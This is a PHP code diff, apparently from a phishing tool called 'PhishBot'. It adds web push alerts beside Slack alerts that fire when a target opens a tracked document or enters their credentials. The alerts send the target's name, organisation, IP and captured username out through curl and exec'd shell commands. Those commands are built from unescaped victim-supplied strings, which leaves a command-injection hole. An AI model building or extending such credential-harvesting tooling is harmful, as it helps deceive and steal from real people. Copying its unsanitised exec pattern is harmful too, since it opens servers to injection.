@@ -186,17 +186,23 @@ if($target != "" && $org != ""){
 
 $message = "> Document opened by ".$target." at ".$org." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";
 
+$messagepush =  "Document opened by ".$target." at ".$org." on ".$browser['platform']."! (".$ip.")";
+
 }
 
 if($target == "" && $org != ""){
 
 $message = "> Document opened at ".$org." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";
 
+$messagepush = "Document opened at ".$org." on ".$browser['platform']."! (".$ip.")";
+
 }
 
 if($target != "" && $org == ""){
 
 $message = "> Document opened by ".$target." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";
+
+$messagepush = "Document opened by ".$target." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";
 
 }
 
@@ -216,6 +222,8 @@ if(!isset($org) || $org == ""){
 
 $message = "> ".$target." just entered their credentials at ".$org."! (<".$APIResultsURL."?UUID=".$id."|".$basicauthuser.">)";
 
+$messagepush = $target." just entered their credentials at ".$org."! (".$basicauthuser.")";
+
 //$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
 //echo $cmd;
 //exec($cmd);
@@ -227,6 +235,11 @@ $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.
 
 //echo $cmd;
 exec($cmd);
+
+// Execute Web Push Notifications
+$cmdpush = 'cd config && php push.php "'.$messagepush.'" "PhishBot" "./doc.png" "'.$APIResultsURL.'?UUID='.$id.'" "PhishBot"';
+
+exec($cmdpush);
 
 }
 }
